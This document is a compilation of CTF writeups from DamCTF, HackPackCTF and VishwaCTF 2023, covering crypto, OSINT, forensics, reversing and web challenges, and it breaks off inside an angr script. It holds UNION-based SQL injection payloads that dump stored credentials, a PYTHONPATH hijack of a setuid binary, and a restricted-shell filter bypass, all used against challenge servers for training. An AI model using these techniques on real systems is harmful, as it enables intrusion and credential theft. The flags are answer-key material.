<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-hackdagos
description: CTF writeups and security challenges by HackDagos.
---

# Writeups by HackDagos

Source repository: `/repos/HackDagos`

## Repository Index

- writeups/README.md
- writeups/VishwaCTF2023/template.md
- writeups/VishwaCTF2023/OSINT/Blockblaster.md
- writeups/VishwaCTF2023/OSINT/Fr1endship Forever.md
- writeups/VishwaCTF2023/OSINT/My FOOLish Opponent.md
- writeups/VishwaCTF2023/OSINT/Privacy Breach.md
- writeups/VishwaCTF2023/OSINT/Super23.md
- writeups/VishwaCTF2023/crypto/Email Incoming.md
- writeups/VishwaCTF2023/crypto/SharingIsCaring.md
- writeups/VishwaCTF2023/crypto/crossingtheredsea.md
- writeups/VishwaCTF2023/crypto/theindecipherablecipher.md
- writeups/VishwaCTF2023/crypto/unfolded.md
- writeups/VishwaCTF2023/forensics/1nj3ct0r.md
- writeups/VishwaCTF2023/forensics/MisteryOfOakvilleTown.md
- writeups/VishwaCTF2023/forensics/fraudulent.md
- writeups/VishwaCTF2023/forensics/thesenderconundrum.md
- writeups/VishwaCTF2023/rev/Reverse Hill.md
- writeups/VishwaCTF2023/rev/ReversingIsEzeeee.md
- writeups/VishwaCTF2023/rev/phicalculator.md
- writeups/VishwaCTF2023/rev/wednesday_thursday_friday.md
- writeups/VishwaCTF2023/steganography/CID.md
- writeups/VishwaCTF2023/steganography/Guatemala.md
- writeups/VishwaCTF2023/steganography/I LOVE YOU.md
- writeups/VishwaCTF2023/steganography/Just Files.md
- writeups/VishwaCTF2023/steganography/Quick Heal.md
- writeups/VishwaCTF2023/steganography/XOR.md
- writeups/VishwaCTF2023/steganography/can_you_see_me.md
- writeups/VishwaCTF2023/web/Mascot.md
- writeups/VishwaCTF2023/web/Payload.md
- writeups/VishwaCTF2023/web/Spooky.md
- writeups/VishwaCTF2023/web/aLive.md
- writeups/VishwaCTF2023/web/eeezzy.md
- writeups/VishwaCTF2023/welcome/Nice guys finish last.md
- writeups/VishwaCTF2023/welcome/Welcome to VISHWACTF'23!.md
- writeups/HackPackCTF 2023/misc/Cat_Me_if_You_Can.md
- writeups/HackPackCTF 2023/misc/Welcome.md
- writeups/HackPackCTF 2023/misc/ezila.md
- writeups/HackPackCTF 2023/pwn/gitignore.md
- writeups/HackPackCTF 2023/rev/gitignore.md
- writeups/HackPackCTF 2023/web/WolfHowl.md
- writeups/HackPackCTF 2023/web/img/gitignore.md
- writeups/HackPackCTF 2023/pwn/img/git3ignore.md
- writeups/DamCTF 2023/binary/gitignorem3.md
- writeups/DamCTF 2023/crypto/gitignore2.md
- writeups/DamCTF 2023/misc/rules.md
- writeups/DamCTF 2023/web/tcl-tac-toe.md

## Writeup Content


### File: writeups/README.md

# writeups


### File: writeups/DamCTF 2023/binary/gitignorem3.md





### File: writeups/DamCTF 2023/crypto/gitignore2.md





### File: writeups/DamCTF 2023/misc/rules.md

# **Writeup - DamCTF**

* Category **misc** 
* Name **rules** 

## Description

Welcome to DamCTF! Make sure to read the rules!


## **Solution**

Just go to the rules and get the flag in the point **2**

flag: **dam{s4niTy_ch3ck_1n_rul35?!}**




### File: writeups/DamCTF 2023/web/tcl-tac-toe.md

# **Writeup - DamCTF**

* Category **web** 
* Name **tcl-tac-toe** 

## Description

Time to tackle tcl-tac-toe: the tricky trek towards top-tier triumph


## **Solution**

Make a request after the PC has won using Burp Suite

`POST /update_board HTTP/1.1`
`Host: 161.35.58.232`
`User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0`
`Accept: */*`
`Accept-Language: en-US,en;q=0.5`
`Accept-Encoding: gzip, deflate`
`Content-Type: application/x-www-form-urlencoded`
`Content-Length: 611`
`Origin: http://161.35.58.232`
`Connection: close`
`Referer: http://161.35.58.232/`

`prev_board=X%20O%20O%20X%20X%20O%20-%20X%20O&new_board=X%20O%20O%20X%20X%20O%20X%20X%20O&signature=1d666ec22c2abd2d5905093b2bbcef6d44449ebfa325386ac3e5b048bb2e1d294f5d0c7c8fdf7e0b53ff35e2ce68e1408ca239282ce3cb312822680cc1a184d2d6e1711cfb82dad448632b33f792743cfc26bd45c36dcc1b2a9731996fc8be3d7ce8b2e5e3dcc246892dd9a283178017d0e7a67b76f5eb8ad886be8f116f1b4392bc0600f4df8eec9c7fd052f103dc78cc3afff11d5329f2003b1f47ad546ca593be79b2b42bda2cd390d466f8dea5616abad4a5b435ed09ed079cc276431b3e9b51f99454f159e4b5d79ab5c5c85ff956c91805fa5138ceb9908d32885d06bbddc54a6210bc6558ccc96db05084f4c78f8bbf661df8a2fcde95e7c9235d014f`

flag: **dam{7RY1N9_Tcl?_71m3_70_74k3_7W0_7YL3n0l_748L37s}**


### File: writeups/HackPackCTF 2023/misc/Cat_Me_if_You_Can.md

# **Writeup - HackPackCTF**

* Category **Misc** 
* Name **Cat Me if You Can** 
* Difficulty **Easy**


## Description

>There's a flag hiding in plain sight, Our cat has been trying to get it for a while now, but it keeps escaping him at the last moment. Can you help him out? Author: Chika
><span style="color:red">nc cha.hackpack.club 41708 </span>


## **Solution**

As soon as we connect to the service we can see that we are provided with a reverse shell:

![reverse shell](img/cat_me_if_you_can_cat.png)

Let's take a look at what's inside the start folder;

by running the command `ls -la` we check the files inside the folder and discover the presence of only one file called "flag.txt"

![ls -la](img/cat_me_if_you_can_ls.png)

If we use the command "cat" to read the file, we'll see that our reverse shell has limitations, and it will respond with "hisssss"

![cat](img/cat_me_if_you_can_cat.png)

>About this challenge I found two solutions (there would be millions of them)

### **First solution (command substitution)**

The goal is simple:
run `>flag.txt` in a subshell and pass the result to `echo`.

This allows us to bypass the filter and read the flag,
using `$()`..

A brief explanation of the command:

>The command contained in `$()` or between the backticks \`..\` is executed in a subshell and the output is then inserted into the original command.

`echo $(<flag.txt)`

![echo](img/cat_me_if_you_can_echo.png)

### **Second solution (pr command)**

The goal is simple:

print all the files in the folder 

A brief explanation of the command:

>pr - convert text files for printing

`pr *`

![pr](img/cat_me_if_you_can_pr.png)


flag: ***flag{(^._.^)_m3ow_me0w_(^._.^)}***



### File: writeups/HackPackCTF 2023/misc/Welcome.md

# **Writeup - HackPackCTF**

* Category **misc** 
* Name **Welcome!** 
* Difficulty **Easy**

## Description

>Welcome to HackpackCTF 2023; go forth and hack!
>
>Observe the rules over at here and join the CTF discord here for the welcome flag. This competition is a class assignment for students at NCSU, so we ask that you hold on publishing writeups after it ends.


## **Solution**

Join the discord server using this link: https://discord.com/invite/yxc7dfQt 

You can see the flag in the **rules** channel.

![alt](img/Welcome_rules.png)

flag: ***flag{W3lc0m3_t0_H4ckP4ckCTF_2023}***



### File: writeups/HackPackCTF 2023/misc/ezila.md

# **Writeup - HackPackCTF**

* Category **Misc**
* Name **ezila**
* Difficulty **Easy**


## Description

BigCorp is going all in on the LLM chat-based AI craze and will soon be publicly releasing EZILA, their very own flag-protection chatbot.\n\nFor the moment, access is limited to beta testers who will use terminal shell access to invoke EZILA and make sure she will properly defend the flag.

nc cha.hackpack.club 41701

## **Solution**

you get access to a shell on a remote machine, there's a file called flag.txt in the directory `/app`, but your user has limited privileges and can't read it.

On the other hand you also have access to a setuid binary called run-ezila that runs the ezila chatbot

```
ctfuser@5642f30325fc:/app$ ls -lah
total 64K
drwxrwxr-x 1 root  root  4.0K Apr 13 02:38 .
drwxr-xr-x 1 root  root  4.0K Apr 16 14:56 ..
-rw-rw-r-- 1 ezila ezila  187 Apr 13 02:20 CREDITS.txt
-rwxr-x--- 1 ezila ezila 7.7K Apr 13 02:20 ezila.py
-r-------- 1 ezila ezila   53 Apr 13 02:37 flag.txt
-rwsr-xr-x 1 ezila ezila  17K Apr 13 02:38 run-ezila
-r-------- 1 ezila ezila  14K Apr 13 02:20 script.txt
```

apparently the permissions needed to read the flag are the same needed to read the script, so if you could get ezila to read the wrong file the challenge would be over.

let's try overriding the libraries used by python using `PYTHONPATH`, hoping the suid executable doesn't sanitize the environment before executing python,

replacing `random` with my code looks like a good idea because ezila doesn't seem to answer in a fully predictable way, so it's probably making use of random numbers

```
ctfuser@5642f30325fc:/app$ export PYTHONPATH=/tmp
ctfuser@5642f30325fc:/app$ cat <<EOF > /tmp/random.py                   
> f = open("flag.txt", "r")
> print(f.read())
> f.close()
> EOF
ctfuser@5642f30325fc:/app$ ./run-ezila 
running /app/ezila.py as uid=1000 (euid=1001)
flag{n3v3r_7ru57_a_ch@7b07_t0_cl3@n_th3_3nv1r0nm3n7}

Traceback (most recent call last):
  File "/app/ezila.py", line 237, in <module>
    main()
  File "/app/ezila.py", line 233, in main
    eliza.run()
  File "/app/ezila.py", line 216, in run
    print(self.initial())
          ^^^^^^^^^^^^^^
  File "/app/ezila.py", line 210, in initial
    return random.choice(self.initials)
           ^^^^^^^^^^^^^
AttributeError: module 'random' has no attribute 'choice'
```

here it is the flag,

remember kids, always clean the environment before escalating privileges

flag: `flag{n3v3r_7ru57_a_ch@7b07_t0_cl3@n_th3_3nv1r0nm3n7}`


### File: writeups/HackPackCTF 2023/pwn/gitignore.md





### File: writeups/HackPackCTF 2023/pwn/img/git3ignore.md





### File: writeups/HackPackCTF 2023/rev/gitignore.md





### File: writeups/HackPackCTF 2023/web/WolfHowl.md

# **Writeup - HackPackCTF**

* Category **WEB** 
* Name **WolfHowl** 
* Difficulty **Easy**


## Description

> Log into WolfHowl website
>[wolfhowl.cha.hackpack.club](https://wolfhowl.cha.hackpack.club)

## **Solution**

The site presents itself to us like this:

![site](img/WolfHowl_site.png)

if we try to register we will be told that registration is disabled, so we can discard a 
possible attack on /register or /login

![error registration](img/WolfHowl_disabled.png)

at this point we are left to check only the search field, if we go to type `"'"` in the search bar the system will respond with an error

![error PDO](img/WolfHowl_error.png)

excellent, we discovered a possible field where to perform a SQL injection! 
at this point, we do a basic injection and see what happens:


`"OR 1=1 --"`

ok by forcing the field to True the site responds to us with all the artists in the database at this point we have confirmation of a SQL injection

![list all artists](img/WolfHowl_or.png)

we can start the database enum
the first thing we need to do is to figure out how many rows the main select returns, to do this we need to run the following query: 

`"UNION SELECT @@VERSION --"`

we get an error returned on the number of rows, this is because the two select (the source one and ours) do not return the same number of rows, we add fields until we catch the same number of rows

![error select rows](img/WolfHowl_select_error.png)

`"UNION SELECT @@VERSION,2,3,4 --"`

![select enum rows](img/WolfHowl_select_enum_rows.png)

perfect! now we can start gathering information about where the flag is stored, let's start by listing the database columns:

`"UNION SELECT table_schema, table_name, column_name,4 FROM information_schema.columns -- "`

![list tables](img/WolfHowl_list_tables.png)

uh! in the employee table we have the columns email and password

![list tables](img/WolfHowl_list_tables2.png)

Now we have all the necessary information; let's list the users

`"UNION SELECT email,password,Title,4 FROM employee -- "`

![list users](img/WolfHowl_users.png)

perfect we have the credentials! 
let's try logging in as GM

![flag](img/WolfHowl_flag.png)

flag : ***flag{art_decorates_space_but_music_decorates_time}***



### File: writeups/HackPackCTF 2023/web/img/gitignore.md





### File: writeups/VishwaCTF2023/OSINT/Blockblaster.md

# **Writeup - VishwaCTF**

* Category **OSINT** 
* Name **Blockblaster** 
* Difficulty **Easy**


## Description
There are many people who criticize or have an opinion about Movies they watch, you can get them from newspapers like "TOI" to online webpages like rotton tomatoes and many more, we need to stop them immediately.


## **Solution**

Ok so, the description tells us an important information about this challenge, the website is https://timesofindia.indiatimes.com/.

I found that the film is **Zameen**, and I found the flag here: https://timesofindia.indiatimes.com/entertainment/hindi/movie-details/zameen/movieshow/61272072.cms.

There is a review from "Kshitij Narkhede32" posted 81 days ago.


flag --> **VishwaCTF{26122018_simmba}**




### File: writeups/VishwaCTF2023/OSINT/Fr1endship Forever.md

# **Writeup - VishwaCTF**

* Category **OSINT** 
* Name **Fr1endship Forever** 
* Difficulty **Medium**


## Description

This is going to be a double hunt...

My childhood Fr1end James has posted something about the project he made on his socials (just to flaunt). Today is our submission day and my Fr1end James is absent. Yesterday when we met him, he told me, "Mark can you submit my project also with yours, as I will be going out of the city tomorrow morning." He forgot to tell me anything about his project. He is not even picking up my phone.

Help me find him and of course his project.

## **Solution**

I found out about "Fr1end James" Twitter account https://twitter.com/Fr1endJames and looked at his 30 March tweet: "Our Endsem_Last_Minute-Project is getting recognization. 
Happy to hear that !!!🗿"

So I checked on GitHub and i found this public project: https://github.com/Your-James/Endsem_Last_Minute-Project

Here I was able to get the flag: **VishwaCTF{LbjtQY_449yfcD}**



### File: writeups/VishwaCTF2023/OSINT/My FOOLish Opponent.md

# **Writeup - VishwaCTF**

* Category **OSINT** 
* Name **My FOOLish Opponent** 
* Difficulty **Easy**


## Description
I love to play blindfold chess and this game is one of my easiest win. It's been a long time since I played this game and now I forgot all moves.
Help me recall my game and mention all the moves we played in flag. (btw I was never good in blindfold games what I did was just played against low rated players).


## **Solution**

When I read the description I immediately thought about "Fool's Mate" because the description says that this is a "low-rate game". 

So I tried all the combinations:
VishwaCTF{g4_e5_f4_Qh4#}
VishwaCTF{g4_e5_f3_Qh4#}
VishwaCTF{g4_e5_f4_Qh4#}
VishwaCTF{f3_e6_g4_Qh4#}
VishwaCTF{f3_e5_g4_Qh4#}
VishwaCTF{f4_e6_g4_Qh4#}
VishwaCTF{f4_e5_g4_Qh4#}
...

And I finally got the flag: **VishwaCTF{f3_e6_g4_Qh4#}**




### File: writeups/VishwaCTF2023/OSINT/Privacy Breach.md

# **Writeup - VishwaCTF**

* Category **OSINT** 
* Name **Privacy Breach** 
* Difficulty **Medium**


## Description

Dude...They just emailed my own password back to me (and it wasn't even asterisked) Don't they know that's a severe breach of privacy!!! Offenders leaked them in PlainText. I hope they lie at the bottom of the deepest pits of hell Can you tell me their domain name??


## **Solution**

This challenge was a bit tricky because it was hard to find the right domain.

I found a list of "sex offender" in **Tumblr** https://plaintextoffenders.com/offenders

i got this GitHub link: https://github.com/plaintextoffenders/plaintextoffenders/blob/master/offenders.csv

The flag was the last one from the list VishwaCTF: napcosecurity.com

flag --> **VishwaCTF{napcosecurity.com}**



### File: writeups/VishwaCTF2023/OSINT/Super23.md

# **Writeup - VishwaCTF**

* Category **OSINT** 
* Name **Super23** 
* Difficulty **Hard**


## Description

The challenge is all about surfing the internet.


## **Solution**

Using the file I found the youtube account: https://www.youtube.com/@jee_engineering

Then I found the link https://twitter.com/IITJEE123

They organize "JEE Advanced 2023", I went to their website (https://jeeadv.ac.in/) --> Archive --> JEE Reports --> 2016

flag: **VishwaCTF{11T_9UW4HAT1_2023_94655}**


### File: writeups/VishwaCTF2023/crypto/Email Incoming.md

# **Writeup - VishwaCTF**

* Category **Cryptography** <!-- challenge category -->
* Name **Email incoming** <!-- challenge name -->
* Difficulty **Medium**

## Description
One fine day Johnny received an E-mail which had just this file. He wonders this might have been sent by one of his friend who was supposed to send a confidential message. But Johnny cannot figure out anything from this file. Can you help him retrieve the message????

## **Solution**
The first thing to do is to crack zip password finding that the password is "thunderbird", and extract files. We understand tht justanimage.png is interesting. Then we look at the image  with xdd command executing:
```sh
xxd justanimage.png
```
We see that image header is image created with pyAEScrypt, sot the next step, is trying to change the image's hex with pyAEScrypt. After doing this we obtain the flag.



### File: writeups/VishwaCTF2023/crypto/SharingIsCaring.md

# **Writeup - VishwaCTF**

* Category **CRYPTO**
* Name **Sharing is Caring**
* Difficulty **MEDIUM**


## Description
In this challenge the flag was encoded using a custom encoding function.
The challenge provides two files:
* a text file containing the encoded flag;
* a python file containing the algorithm used.


## **Solution**
### The **algorithm**
```Python
from sympy import randprime
from random import randrange

k = 3
n = 5
def generate_shares(secret, k, n):
    prime = randprime(secret, 2*secret)
    coeffs = [secret] + [randrange(1, prime) for _ in range(k-1)]
    shares = []
    for i in range(1, n+1):
        x = i
        y = sum(c * x**j for j, c in enumerate(coeffs)) % prime
        shares.append((x, y))
    return shares, prime
```

where `secret` is the _ASCII code_ of the given char.

### Example of an encoded char of the **flag**

```
[(1, 76), (2, 31), (3, 58), (4, 50), (5, 7)], 107
```

### Some considerations
* We have that `k = 3` so

```Python
coeffs = [secret] + [randrange(1, prime) for _ in range(k-1)]
coeffs = [secret] + [randrange(1, prime) for _ in range(2)]
coeffs = [secret, randrange(1, prime), randrange(1, prime)]
```

* Examining the for loop we find that the first iteration where `x = 1` gives the following result

```Python
y = sum(c * x**j for j, c in enumerate(coeffs)) % prime
y = sum(c * 1**j for j, c in enumerate(coeffs)) % prime
y = sum(c * 1 for j, c in enumerate(coeffs)) % prime
y = sum(c for j, c in enumerate(coeffs)) % prime
y = sum(coeffs) % prime
```

* This small considerations seems to be enought to brute force the solution in a reasonable amount of time


```Python
from string import printable
import ast

# here is the main part
# the decryption algorithm
def lets_try(prime, shares):
	chars = ""  # the possible chars that satisfy the conditions
	# we brute force through all printable chars
	for char in printable:
		bc = ord(char)  # ASCII code of the char
        # we brute force through all possible 
        # random numbers between 1 and the prime number
		for r1 in range(1, prime):
            # there is no need to brute force through the second
            # random number because, from the considerations we 
            # did, we know that 
            # sum([secret, r1, r2]) = shares[0]
			r2 = shares[0] - bc - r1
            # there is no need to check the sign of r2 because
            # we are working with modulo operations
			coeffs = [bc, r1, r2]
			if shares[1] == sum(c * 2**j for j, c in enumerate(coeffs)) % prime:
				if shares[2] == sum(c * 3**j for j, c in enumerate(coeffs)) % prime:
					if shares[3] == sum(c * 4**j for j, c in enumerate(coeffs)) % prime:
						if shares[4] == sum(c * 5**j for j, c in enumerate(coeffs)) % prime:
							chars += char
	# just in case there are more than one char that satisfy all conditions
	if len(chars) > 1:
		return f"[{chars}]"
	return chars

# here we just read the encoded flag
# and decrypt it 
def print_flag():
	flag = ""
	with open("output.txt", "r") as f:
		for line in f.readlines():
			content = line.strip()
			prime_index = content.rfind(",")
			prime = int(content[prime_index + 2:])
			shares = [el[1] for el in ast.literal_eval(content[:prime_index])]
			char = lets_try(prime, shares)
			flag += char
	print(flag)

print_flag()
```


After just a second the result appears to be 

```
VishwaCTF{l4gr4ng[3p]_f0r_th[3n]_w1n[kF!]}
```

We can make a pretty reasonable guess and try

```
VishwaCTF{l4gr4nge_f0r_the_w1n!}
```

And there it is! That was the flag.



### File: writeups/VishwaCTF2023/crypto/crossingtheredsea.md

# **Writeup - VishwaCTF**

* Category **Crypto**
* Name **Crossing the red sea**
* Difficulty **Medium**

## Description
The description says: "Everything is just f\*cked up here".
We are given a file which contains an encrypted string.
The string is `0e0e0e0e0e0e0e0e0e0e0p0a0e0a0e0e0e0a0e0e0e0e0e0e0e0a0e0e0e0e1e1e0e0e1e0e0c0c0c0c1i0s0a0a0a0a0i0i0i0i0i0j1e0e0e0e0e0e0e0e0e0e0e0e0e0j0c0i0i0i0i0i0i0i0i0i1i0i0i0i0i0i0i0i0i0j0a0e0e0j0i0i0i0i0i0i0i0j0e0e0e0e0e0e0e0e0e0e0e1e1e0e1j1c0j1a1i0i1i1i0i0i1i1i1i1i0i1i0i0i1j0i0i1j0c0e1j0a0i0i0i0i0i0i0j0c0i0j0a0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0e0j0c0i0j0a0i0i0i0i0i0i0i0i0i0i0i0i0i0i0i0i0i0i0i1j0e0e0e0e1j0c0i1i0i0j1j0a0e1e0e0e1e0e0e1e0e0j1e0e0e1e0e0e1e0e0e1e0e0e1e0e0e1e0e0j1100000000000000000000000000000000100001001001001001001001001001001001100000000000000000000000000000000000000000000000100001001001001001001001001001001001001001001001001001001001001001001100011001001001100010001001001001001001001001001001001001001100011000000000100010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100011001001001001001001001001001001001001001001001001001001001100000000100001001001001001100000000000000000000000100001001001001100010001001001001001001001001001100011001001100010001001001001001001001001001001001001001001001100`.

## Solution
By looking at the description we can suppose this string has been encrypted with some "fuck" cipher.
Decoding the string with binaryfuck cipher gives us the first part of the flag, which is `vishwaCTF{35073r1c`.
Next, we decode the same string with alphuck, obtaining the second part of the flag `_l4ngu4ge5_4r3_c00l}`.

`vishwaCTF{35073r1c_l4ngu4ge5_4r3_c00l}`



### File: writeups/VishwaCTF2023/crypto/theindecipherablecipher.md

# **Writeup - VishwaCTF**

* Category **Crypto**
* Name **The indecipherable cipher**
* Difficulty **Medium**

## Description
We are given this string `j3qrh4kgz3iptmyqxcw0zkm8i5xugs5lwl0lrwvirwktlqinexcw0zkmq5nqvpebpor5wqipqhw2ikzm4ipktzlr` and the description cites "Mr. Kasiski".

## Solution
Kasiski was an hint for the Vigenere cipher. We can decrypt the ciphertext with [dcode.fr](https://www.dcode.fr/vigenere-cipher) automatic decryption by extending the normal alphabet with numbers.

The plaintext is `friedrichwilhelmkasiskiwastheonewhodesignedtheaaakasiskiexaminationtodecodevignerecipher`.

`VishwaCTF{friedrichwilhelmkasiskiwastheonewhodesignedtheaaakasiskiexaminationtodecodevignerecipher}`



### File: writeups/VishwaCTF2023/crypto/unfolded.md

# **Writeup - VishwaCTF**

* Category **Crypto**
* Name **Unfolded**
* Difficulty **Medium**

## Description
We are given a file called `Step_1.json`, which contained an encrypted json with a plaintext key.
In the description we get a hint about Giovan Battista Bellaso.

## Solution
1. Decrypt the json file with a vigenere cipher decrypt tool, using the key provided.
2. The decrypted file looks like this:
```
Original:
{
    "Dmwktihi": "xpdnsrwp0690",
    "Beaera": "Vrxgovg Gmznfgismix, Qtb Qhympxjextb,Jtyc sbxuki",
    "Nxmvgbdsh": "4ih sdlt",
    "Mwmlbzcoi": "Wwiawx Ksmcfz Gkvhyby",
    "Key": "justgiveupanddie"
}


Decrypted:
{
   "Username": "dadapool0690",
   "Skills": "Android Development, Web Development,Open source",
   "Education": "4th fail",
   "Institute": "Chintu Coding Academy"
}
```
3. Since under skills there are coding related skills, search `dadapool0690` on github.
4. Found a user with a corresponding username who have only one repo.
5. This repo contained a base64 encoded image called "FOLDME"
6. "Fold" the image. This can be done with gimp following these steps:
    * open the image in gimp
    * duplicate the layer and make both layer to 50% opacity
    * select the flip tool and flip one layer vertically
    * to better see the text duplicate the gray channel a few times and you should see an image:
![folded.png](folded.png)
7. Go to the drive folder and open the flag.txt file

`VishwaCTF{0r1g4m1_1s_4n_4rt_856462584532}`



### File: writeups/VishwaCTF2023/forensics/1nj3ct0r.md

# **Writeup - VishwaCTF**

* Category **Forensics** 
* Name **1nj3ct0r** 
* Difficulty **Hard**


## Description

You Are Working As Digital Forensics Expert At Infosys India And Someone Reported That A PC Might Have Been Infected. Tech Team Already Collected All The Evidences From Workstation And Found That Someone Injected Malicious Code. It Is Your Job To Find, what Is Injected Into That PC.

NOTE:Use Underscore(_) After Every Word.


## **Solution**

The challenge give you a file "usbforensics.pcapng", you can open it with **Wireshark**, there are 278 packets with the USB / USBHUB protocols.

Use this filter: usb.data_flag && usb.data_len == 2 and export the data.

flag: **VishwaCTF{n0w_y0u_423_d0n3_w17h_u58_f023n51c5}**



### File: writeups/VishwaCTF2023/forensics/MisteryOfOakvilleTown.md

# **Writeup - VishwaCTF**

* Category **Forensics**
* Name **Mistery Of Oakville Town**
* Difficulty **Medium**

## Description
> On March 27, 2023, a golden sceptre was taken from Oakville Town Hall. Suspect Johannes Trithemius has been taken into custody by Detective Jameson. Jameson believes he is the town's fugitive thief's right-hand man. Jameson was able to retrieve one image that he thinks contains details about the vehicle the thief fled in, even though Johannes had erased all digital traces from the device. There are four intertown highways in Oakville, and they are constantly closely watched. The database contains all the data on the roads as well as the data on the residents of the towns. Find the thief and town name he escaped to. Watch out for Johannes, a cunning con artist who frequently knows how to trick the police.
> Flagformat: VishwaCTF{FirstNameLastNameTown}

We are given two files, a jpeg image and a sqlite3 database.

## **Solution**
Initially, we tried to search the db for the license plate showed in the image, without success.
After that, based on the timestamp of the image (27/03/2023 21:45) we can query the db to see if there's any car that had been seen at that time.
```
sqlite> select * from traffic_cam3 where year='2023' and month='3' and day='27' and hour='21';
id|towards_town_code|year|month|day|hour|minute|license_plate
715|SW|2023|3|27|21|45|OV-007
```

Ok, now we can search the name:
```
sqlite> select name from people where license_plate='OV-007';
name
Wellington East
```

And the town name:
```
sqlite> select town_name from town_code where town_code='SW';
town_name
Springwood
```

`VishwaCTF{WellingtonEastSpringwood}`



### File: writeups/VishwaCTF2023/forensics/fraudulent.md

# **Writeup - VishwaCTF**

* Category **forensics** <!-- challenge category -->
* Name **Fraudulent** <!-- challenge name -->
* Difficulty **Medium**


## Description

I got ditched by someone and I need your help !!! The bill amount that was charged to me was not correct. The image of the bill was corrupted. Sources said that some PIXELS of the image were FORRENSICAllY manipulated or edited, leading to changes in the total bill amount. You have to reach the image to see what happened. Remember to analyze every pixel of the image carefully.

P.S.: Round off the actual total amount to closest Integer.

Flag Format : VishwaCTF{actual_total_amount}

## **Solution**

superimposing the 2 frames of the gif you get a pattern of 1s and 0s that reminds of a qr code, so let's try restoring it, the 1s become black pixels and the 0s become white, but it won't scan.

It seems that some parts are missing, namely the position detection patterns, alignment pattern and timing pattern are all mangled, so, after editing again in gimp and restoring the lost pieces, the code is now readable and the content is `https://github.com/Amanjain4269/next-step.git`, that's where the second phase begins.

The link obtained previously refers to a github repository containing an image with the calculations for the bill amount our client said was false, getting a hint from the description we search the web for the word `forensically`, apparently there's a website at the address [https://29a.ch/photo-forensics/](https://29a.ch/photo-forensics/) that offers functions to analyze images for the purpouse of detecting tampering, just what's needed right now.

Using the error level analysis tool you can see that the first digits of both the `phone` and the `laptop` expenses are unlike the others, maybe they were added later? let's try calculating the total amount without these digits...
```
(23454+6574+456280)(1+(18/100))
573843
```

let's try submitting and.. the answer is right

flag: VishwaCTF{573843}


### File: writeups/VishwaCTF2023/forensics/thesenderconundrum.md

# **Writeup - VishwaCTF**

* Category **Forensics**
* Name **The Sender Conundrum**
* Difficulty **Easy**

## Description
We are given two files, an email SMTP transcript and a zip folder encrypted with a password called "unzipme.zip"

## Solution
The email contains a riddle whose solution is "name". Looking for names in the email we can see BrandonLee@anonymousemail.me.
Unzip the zip folder with password "BrandonLee" and you will get the flag.txt file.

`vishwaCTF{1d3n7i7y_7h3f7_is_n0t_4_j0k3}`



### File: writeups/VishwaCTF2023/rev/Reverse Hill.md

# **Writeup - VishwaCTF**

* Category **rev** 
* Name **Reverse Hill** 
* Difficulty **Medium**


## Description

Buddy Backpacker a famous hiker had gone for a hike on the reverse_hill. I have decided to go on this hike but i do not know the best way up. So i approached Buddy Backpacker for help and he gave me this file. But there is some problem. I think its not giving me the proper way. Can you help me? And if you succeed you can have a flag in return.

Hint:When entering the flag use a underscore(_) after each word.


## **Solution**

This challenge is about reversing a Hill Cipher decryption function that uses a randomized matrix. 

Note that the Hill Cipher decryption function is "spread" across three functions named **function1**, **function2**, and **function3**. 

**function1**: This function takes a single argument *a* which represents the row number of the matrix we should decrypt. It also calls function2, but with just this function we won't do much.

**function2**: This function initializes the *c* matrix with the *a* matrix provided in the code. 

**function3**: generates a randomized matrix c by generating random values. This function then returns a pointer to the *c* matrix.

**SOLVE**: patch function3 to return a "fixed" matrix instead of a randomized one. We can patch it using a debugger.

**ANOTHER SOLUTION**: patch function2 to get the randomized c matrix and then use it to take the b matrix and the plaintext for a single row. 

flag: **VishwaCTF{matrix_the_way_around}**



### File: writeups/VishwaCTF2023/rev/ReversingIsEzeeee.md

# **Writeup - VishwaCTF**

* Category **Reversing**
* Name **Reversing is Ezeeee**
* Difficulty **Medium**

## Description
We are given an exe file called `examine.exe` and nothing else.

## **Solution**
By looking at the strings in the file, we found that pygame was used (a python library).
In order to solve this challenge you have to convert the exe back to python with a tool like [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor).
Once you have extracted the file you'll find a folder with many file. Look for strings inside the `examine.pyc` file and you'll find this hex bytes string: `5669736877614354467b31355f70797468306e5f7468335f623335745f6c346e67753467333f3f7d`.
By converting it in a printable string with the command:
```sh
echo "5669736877614354467b31355f70797468306e5f7468335f623335745f6c346e67753467333f3f7d" | xxd -r -p
```

you'llget the flag:
`VishwaCTF{15_pyth0n_th3_b35t_l4ngu4g3??}`




### File: writeups/VishwaCTF2023/rev/phicalculator.md

# **Writeup - VishwaCTF**

* Category: **Rev**
* Name: **Phi Calculator**
* Difficulty: **Easy**

## Description
We are given a python file of a program that is in a trial version.
The interesting parts of the program are:
* the `key_part_static1_trial` variable which contains the initial part of the flag
* the `check_key` function that checks if the provided key is correct

## Solution
We can retrieve the key by following the steps of the `check_key` function to obtain the dynamic part of the flag and then put them together.

```
import hashlib
bUsername_trial = b"vishwaCTF"
key_part_static1_trial = "VishwaCTF{m4ke_it_p0ssible_"
key_part_dynamic_trial = ""
key_part_static2_trial = "}"
hashed_key = hashlib.sha256(bUsername_trial).hexdigest()
arr = [4, 5, 3, 6, 2, 7, 1, 8] 
key_part_dynamic_trial = "".join([hashed_key[i] for i in arr])
key = key_part_static1_trial + key_part_dynamic_trial + key_part_static2_trial
print(key)
```

`VishwaCTF{m4ke_it_p0ssible_b7cdc517}`



### File: writeups/VishwaCTF2023/rev/wednesday_thursday_friday.md

# **Writeup - VishwaCTF**

* Category **reverse** 
* Name **Wednesday Thursday Friday** 
* Difficulty **Medium**


## Description
Enter the Flag !!

## **Solution**
Apparently it's a program rhat runs some checks on the input and tells you if it's a valid flag, first step is to understand how it checks the flag, so i open it with ghidra.  
Turns out that it wants 34 characters in the first argument, it interprets them as integers and in the main function there's a system of equations that, if solved, would give values describing the correct flag.

It would be very time consuming to solve by hand, but luckily some automatic tools exist, such as angr.

So i used **angr** in a python script to get the correct input to make the program execute successfully.

To solve this challenge we used this script:
```python
import angr
import claripy

def main():
    
    binary_path = './solveme'
    project = angr.Project(binary_path, auto_load_libs=False, main_opts={'base_addr' : 0x00100000})

    input_length = 32
    flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(input_length)]
    flag = claripy.Concat(*flag_chars)  

    
